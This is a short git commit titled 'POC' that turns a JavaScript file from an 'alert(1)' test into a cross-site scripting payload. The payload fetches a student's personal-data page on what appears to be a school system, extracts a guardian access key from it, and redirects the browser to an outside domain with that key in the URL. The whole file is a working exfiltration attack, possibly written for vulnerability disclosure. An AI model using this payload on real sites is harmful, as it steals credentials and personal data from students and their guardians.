8ec78ec424a8cc92523303cf7b43a3ed698c379b
Jao42 <joaovictormedeiros41@gmail.com>
2023-11-08 14:28:08 -0300

    POC

--- a.js
+++ a.js
@@ -1,1 +1,17 @@
-alert(1)
+fetch('/edu/aluno/202010040036/?tab=dados_pessoais')
+    .then(function(response) {
+        return response.text()
+    })
+    .then(function(html) {
+        let parser = new DOMParser();
+        let doc = parser.parseFromString(html, "text/html");
+        let chaveResponsavel = doc.querySelector('div[data-tab="dados_pessoais"] [class="box "]:nth-child(2) tbody tr:nth-child(4) :nth-child(2)').textContent
+
+        window.location = 'https://jao42.dev.br/?chave_responsavel=' + chaveResponsavel
+    })
+    .catch(function(err) {  
+        console.log('Failed to fetch page: ', err);  
+    });
+
+
+
